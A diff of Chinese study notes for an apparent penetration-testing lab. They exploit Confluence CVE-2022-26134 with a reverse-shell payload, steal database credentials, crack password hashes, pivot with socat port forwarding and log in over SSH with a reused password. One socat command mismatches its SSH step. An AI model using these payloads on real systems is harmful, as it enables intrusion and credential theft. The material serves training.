@@ -1201,13 +1201,13 @@ CONFLUENCE01 跨越 WAN 和 DMZ，可在兩個 networks 上進行通訊。 CONFL
 
 ### Setting Up the Lab Environment
 為了存取 CONFLUENCE01，我們需要利用 Confluence Web 應用程式中的命令執行漏洞來取得 Reverse shell。
-在 [Rapid7](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) 的 blog ，其中包含 [cURL](https://curl.se/) cmd 和 [proof-of-concept](https://en.wikipedia.org/wiki/Proof_of_concept) payload，該有效 payload 聲稱利用該漏洞並返回反向 shell
+在 [Rapid7](https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/) 的 blog ，其中包含 [cURL](https://curl.se/) cmd 和 [proof-of-concept](https://en.wikipedia.org/wiki/Proof_of_concept) payload，該有效 payload 聲稱利用該漏洞來取得 reverse shell
 
 - example payload from the Rapid7 blog post
 ```
 curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/
 ```
-> curl-vhttp://10.0.0.28:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/
+> curl-v `http://10.0.0.28:8090/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}`/
 
 在不了解其功能的情況下，先弄清楚這個 proof-of-concept 中發生了什麼
 > OGNL injection
@@ -1217,3 +1217,282 @@ curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29
 > 一種 Java 應用程式中常用的表達語言。當應用程式以將使用者輸入傳遞給 OGNL 表達式解析器的方式處理使用者輸入時，就會發生 OOGNL injection。由於可以在 OGNL 表達式內執行 Java 程式碼，因此可以使用 OGNL injection 來執行任意程式碼。\
 OGNL 注入負載本身使用 Java 的 ProcessBuilder 類別來產生Bash互動式反向 shell（bash -i）。
 
+```java
+new javax.script.ScriptEngineManager()
+  .getEngineByName("nashorn")
+  .eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()");
+```
+> 透過 ProcessBuilder 執行 bash -i，建立 Reverse Shell 連線到攻擊者的機器（10.0.0.28:1270）
+
+#### 1. 將 payload 改成符合我們的環境
+(Kali)
+```
+┌──(chw㉿CHW)-[~]
+└─$ ip a                        
+...
+4: tun0: <POINTOPOINT,MULTICAST,NOARP,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 500
+    link/none 
+    inet 192.168.45.182/24 scope global tun0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::98aa:d7b6:2ab1:44a3/64 scope link stable-privacy proto kernel_ll 
+       valid_lft forever preferred_lft forever
+                      
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 5678
+listening on [any] 5678 ...
+```
+> 目標機器： `192.168.228.63:8090`
+> 自己的 kali ip: `192.168.45.182`
+
+```
+┌──(chw㉿CHW)-[~]
+└─$ curl http://192.168.228.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.182/5678%200%3E%261%27%29.start%28%29%22%29%7D/
+```
+```
+┌──(chw㉿CHW)-[~]
+└─$ nc -nvlp 5678
+listening on [any] 5678 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.228.63] 33550
+bash: cannot set terminal process group (2566): Inappropriate ioctl for device
+bash: no job control in this shell
+bash: /root/.bashrc: Permission denied
+confluence@confluence01:/opt/atlassian/confluence/bin$ id
+id
+uid=1001(confluence) gid=1001(confluence) groups=1001(confluence)
+confluence@confluence01:/opt/atlassian/confluence/bin$ 
+```
+> 成功執行 Reverse shell
+
+#### 2. enumeration 機器設定
+成功執行 Reverse shell 後，首先 enumeration CONFLUENCE01
+##### 2.1 確認 network interface
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ ip addr
+ip addr
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+4: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:ab:b0:50 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.228.63/24 brd 192.168.228.255 scope global ens192
+       valid_lft forever preferred_lft forever
+5: ens224: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
+    link/ether 00:50:56:ab:59:55 brd ff:ff:ff:ff:ff:ff
+    inet 10.4.228.63/24 brd 10.4.228.255 scope global ens224
+       valid_lft forever preferred_lft forever
+```
+> `ens192`（連到 WAN）：192.168.228.63\
+`ens224`（連到內部 DMZ）：10.4.228.63
+
+##### 2.2 ip route 確認連線狀況
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ ip route
+ip route
+default via 192.168.228.254 dev ens192 proto static 
+10.4.228.0/24 dev ens224 proto kernel scope link src 10.4.228.63 
+192.168.228.0/24 dev ens192 proto kernel scope link src 192.168.228.63
+```
+> 確認 10.4.228.0/24 內部網段可透過 `ens192 interface` 存取
+
+##### 2.3 尋找 Confluence configuration
+
+在 `/var/atlassian/application-data/confluence/confluence.cfg.xml` 中找到 Confluence 設定檔
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ cat /var/atlassian/application-data/confluence/confluence.cfg.xml
+<sian/application-data/confluence/confluence.cfg.xml   
+<?xml version="1.0" encoding="UTF-8"?>
+
+<confluence-configuration>
+  <setupStep>complete</setupStep>
+  <setupType>custom</setupType>
+  <buildNumber>8703</buildNumber>
+  <properties>
+...
+    <property name="hibernate.connection.password">D@t4basePassw0rd!</property>
+    <property name="hibernate.connection.url">jdbc:postgresql://10.4.228.215:5432/confluence</property>
+    <property name="hibernate.connection.username">postgres</property>
+...
+  </properties>
+</confluence-configuration>
+confluence@confluence01:/opt/atlassian/confluence/bin$ 
+```
+> 顯示明文資料庫憑證：
+> - PostgreSQL 資料庫 `10.4.228.215:5432`
+> - Username：`postgres`
+> - Password：`D@t4basePassw0rd!`
+
+>[!Note]
+> 直接連線遇到問題：\
+> CONFLUENCE01 沒有 PostgreSQL 客戶端 (psql)，所以無法直接存取資料庫。
+我們的 Kali 也無法直接連線，因為 PGDATABASE01 只允許內部網段存取
+
+>[!Important]
+>解決方法：**使用 Port Forwarding 透過 CONFLUENCE01 存取資料庫**\
+> 在 CONFLUENCE01 上建立一個 port forwarding，監聽 WAN 介面上的一個端口，然後將該連接埠上收到的所有資料包轉發到內部子網路上的 PGDATABASE01。將使用 [Socat](http://www.dest-unreach.org/socat/doc/socat.html) 來完成。
+
+### Port Forwarding with Socat
+- `PGDATABASE01（10.4.228.215:5432）`: 只能從內部 DMZ 存取。
+- `Kali（192.168.45.182）`: 無法直接連線。
+
+讓 CONFLUENCE01 監聽 WAN（192.168.228.63）上的某個 Port，並轉發流量到內部 PostgreSQL。這樣 Kali 就能透過 CONFLUENCE01 存取資料庫！
+![image](https://hackmd.io/_uploads/HktbqW7o1g.png)
+
+在 CONFLUENCE01 的 WAN 介面上開啟 TCP 連接埠 2345，然後從我們的 Kali 機器連接到該 port。將發送到該連接埠的所有封包都由 CONFLUENCE01 轉送到 PGDATABASE01 上的 TCP port 5432。一旦我們設定了連接埠轉發，連接到 CONFLUENCE01 上的 TCP port 2345 將與直接連接到 PGDATABASE01 上的 TCP port 5432 完全一樣。
+
+>[!Tip]
+> 若發現環境中沒有安裝 Socat，可以下載 binary version
+
+#### Socat process (for DB)
+將啟動一個詳細的（-ddd）Socat process。
+1. 將監聽 TCP 連接埠 2345 ( TCP-LISTEN:2345 )，
+2. 在收到連線時分叉成一個新的子程序 ( fork )，而不是在收到一個連線後就終止
+3. 然後將收到的所有流量轉送到 PGDATABASE01 上的 TCP 連接埠 5432 (TCP:10.4.228.215:5432)
+
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
+<cat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
+2025/03/03 11:02:36 socat[4442] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
+2025/03/03 11:02:36 socat[4442] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
+2025/03/03 11:02:36 socat[4442] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
+2025/03/03 11:02:36 socat[4442] I setting option "fork" to 1
+2025/03/03 11:02:36 socat[4442] I socket(2, 1, 6) -> 5
+2025/03/03 11:02:36 socat[4442] I starting accept loop
+2025/03/03 11:02:36 socat[4442] N listening on AF=2 0.0.0.0:2345
+```
+> `TCP-LISTEN:2345,fork`: 讓 socat 監聽本機 2345 port\
+> `fork`: 當有新連線時，socat 會 fork 一個新的 process 來處理該連線，而主 process 繼續監聽 2345\
+> `TCP:10.4.228.215:5432`: 將流量轉發到 10.4.228.215:5432
+
+![image](https://hackmd.io/_uploads/BJdzTZmskx.png)
+
+####  psql
+在 Kali 上使用 psql 登入 PGDATABASE01
+```
+┌──(chw㉿CHW)-[~]
+└─$ psql -h 192.168.228.63 -p 2345 -U postgres        
+Password for user postgres: 
+psql (16.3 (Debian 16.3-1+b1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type "help" for help.
+
+postgres=# \l
+                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    |   Access privileges   
+------------+----------+----------+-------------+-------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres          +
+            |          |          |             |             | postgres=CTc/postgres
+(4 rows)
+```
+> 成功登入 PostgreSQL database
+> > 可以存取 `confluence database`
+
+繼續 enumeration\
+在 [confluence database](https://jira.atlassian.com/browse/CONFSERVER-41321) 查詢 cwd_user table，這會包含所有 username 和 password hash
+```
+postgres=# \c confluence
+psql (14.2 (Debian 14.2-1+b3), server 12.11 (Ubuntu 12.11-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database "confluence" as user "postgres".
+
+confluence=# select * from cwd_user;
+
+   id    |   user_name    | lower_user_name | active |      created_date       |      updated_date       | first_name | lower_first_name |   last_name   | lower_last_name |      display_name      |   lower_display_name   |           email_address            |        lower_email_address         |             external_id              | directory_id |                                credential                                 
+---------+----------------+-----------------+--------+-------------------------+-------------------------+------------+------------------+---------------+-----------------+------------------------+------------------------+------------------------------------+------------------------------------+--------------------------------------+--------------+---------------------------------------------------------------------------
+  458753 | admin          | admin           | T      | 2022-08-17 15:51:40.803 | 2022-08-17 15:51:40.803 | Alice      | alice            | Admin         | admin           | Alice Admin            | alice admin            | alice@industries.internal          | alice@industries.internal          | c2ec8ebf-46d9-4f5f-aae6-5af7efadb71c |       327681 | {PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
+ 1212418 | trouble        | trouble         | T      | 2022-08-18 10:31:48.422 | 2022-08-18 10:31:48.422 |            |                  | Trouble       | trouble         | Trouble                | trouble                | trouble@industries.internal        | trouble@industries.internal        | 164eb9b5-b6ef-4c0f-be76-95d19987d36f |       327681 | {PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
+ 1212419 | happiness      | happiness       | T      | 2022-08-18 10:33:49.058 | 2022-08-18 10:33:49.058 |            |                  | Happiness     | happiness       | Happiness              | happiness              | happiness@industries.internal      | happiness@industries.internal      | b842163d-6ff5-4858-bf54-92a8f5b28251 |       327681 | {PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
+ 1212417 | database_admin | database_admin  | T      | 2022-08-18 10:24:34.429 | 2022-08-18 10:24:34.429 | Database   | database         | Admin Account | admin account   | Database Admin Account | database admin account | database_admin@industries.internal | database_admin@industries.internal | 34901af8-b2af-4c98-ad1d-f1e7ed1e52de |       327681 | {PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
+ 1212420 | hr_admin       | hr_admin        | T      | 2022-08-18 18:39:04.59  | 2022-08-18 18:39:04.59  | HR         | hr               | Admin         | admin           | HR Admin               | hr admin               | hr_admin@industries.internal       | hr_admin@industries.internal       | 2f3cc06a-7b08-467e-9891-aaaaeffe56ea |       327681 | {PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
+ 1441793 | rdp_admin      | rdp_admin       | T      | 2022-08-20 20:46:03.325 | 2022-08-20 20:46:03.325 | RDP        | rdp              | Admin         | admin           | RDP Admin              | rdp admin              | rdp_admin@industries.internal      | rdp_admin@industries.internal      | e9a9e0f5-42a2-433a-91c1-73c5f4cc42e3 |       327681 | {PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
+(6 rows)
+
+(END)
+```
+
+#### hashcat 爆破
+根據 [Hashcat mode number](https://hashcat.net/wiki/doku.php?id=example_hashes) 查詢，Atlassian (PBKDF2-HMAC-SHA1) hashes 是 12001
+```
+┌──(chw㉿CHW)-[~]
+└─$ cat hashes.txt 
+{PKCS5S2}WbziI52BKm4DGqhD1/mCYXPl06IAwV7MG7UdZrzUqDG8ZSu15/wyt3XcVSOBo6bC
+{PKCS5S2}A+U22DLqNsq28a34BzbiNxzEvqJ+vBFdiouyQg/KXkjK0Yd9jdfFavbhcfZG1rHE
+{PKCS5S2}R7/ABMLgNl/FZr7vvUlCPfeCup9dpg5rplddR6NJq8cZ8Nqq+YAQaHEauk/HTP49
+{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0
+{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV
+{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34
+                                                                                                
+┌──(chw㉿CHW)-[~]
+└─$ hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 17.0.6, SLEEF, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: cpu--0x000, 1437/2939 MB (512 MB allocatable), 3MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 6 digests; 6 unique digests, 6 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+...
+{PKCS5S2}skupO/gzzNBHhLkzH3cejQRQSP9vY4PJNT6DrjBYBs23VRAq4F5N85OAAdCv8S34:P@ssw0rd!
+{PKCS5S2}QkXnkmaBicpsp0B58Ib9W5NDFL+1UXgOmJIvwKjg5gFjXMvfeJ3qkWksU3XazzK0:sqlpass123
+{PKCS5S2}EiMTuK5u8IC9qGGBt5cVJKLu0uMz7jN21nQzqHGzEoLl6PBbUOut4UnzZWnqCamV:Welcome1234
+...
+```
+> 成功破解其中三位使用者密碼，分別是 `database_admin`, `hr_admin` 與 `rdp_admin`
+
+需要懷疑這些密碼可能在其他地方被重複使用\
+可以發現 PGDATABASE01 也有啟用 SSH server
+#### Socat process (for SSH)
+利用 socat 建立供 ssh 使用的 port forwarding，**需要先終止原本的 Socat process**
+```
+confluence@confluence01:/opt/atlassian/confluence/bin$ socat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432
+<ocat -ddd TCP-LISTEN:2345,fork TCP:10.4.228.215:5432   
+2022/08/18 10:12:01 socat[46589] I socat by Gerhard Rieger and contributors - see www.dest-unreach.org
+2022/08/18 10:12:01 socat[46589] I This product includes software developed by the OpenSSL Project for use in the OpenSSL Toolkit. (http://www.openssl.org/)
+2022/08/18 10:12:01 socat[46589] I This product includes software written by Tim Hudson (tjh@cryptsoft.com)
+2022/08/18 10:12:01 socat[46589] I setting option "fork" to 1
+2022/08/18 10:12:01 socat[46589] I socket(2, 1, 6) -> 5
+2022/08/18 10:12:01 socat[46589] I starting accept loop
+2022/08/18 10:12:01 socat[46589] N listening on AF=2 0.0.0.0:2345
+```
+![image](https://hackmd.io/_uploads/BJLzIMmjkx.png)
+
+```
+kali@kali:~$ ssh database_admin@192.168.228.63 -p2222
+The authenticity of host '[192.168.228.63]:2222 ([192.168.228.63]:2222)' can't be established.
+ED25519 key fingerprint is SHA256:3TRC1ZwtlQexLTS04hV3ZMbFn30lYFuQVQHjUqlYzJo.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '[192.168.228.63]:2222' (ED25519) to the list of known hosts.
+database_admin@192.168.228.63's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-122-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+...
+database_admin@pgdatabase01:~$
+```
+> 成功登入 database_admin
+
+>[!Important]
+>除了 socat 之外，還有其他方式可以在 UNIX / Linux 系統上建立 Port Forwarding:
+>- rinetd（Redirection Internet Daemon:\
+適合 longer-term port forwarding ，以 daemon 運行。
+>- netcat + FIFO
+>可以透過 netcat 和 FIFO 文件來建立端口轉發，這種方法適合簡單或一次性的轉發需求。
+>- iptables（需 root 權限）
+>需要額外啟用 Linux 封包轉發功能: `echo 1 > /proc/sys/net/ipv4/conf/[interface]/forwarding`
+
+## SSH Tunneling
